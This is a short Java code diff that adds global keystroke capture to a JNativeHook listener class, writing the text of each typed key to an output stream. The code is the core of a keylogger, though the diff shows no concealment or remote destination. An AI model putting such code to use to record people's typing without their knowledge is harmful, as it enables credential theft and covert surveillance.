@@ -5,10 +5,26 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+import java.io.IOException;
+import java.io.OutputStream;
+import java.nio.charset.Charset;
+
 public class GlobalKeyListener implements NativeKeyListener {
+
+    private OutputStream outputStream;
+
+    public GlobalKeyListener(OutputStream out) {
+        outputStream = out;
+    }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent keyEvent) {
+        String keyString = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
+        try {
+            outputStream.write(keyString.getBytes(Charset.forName("UTF-8")));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
 
     }
 
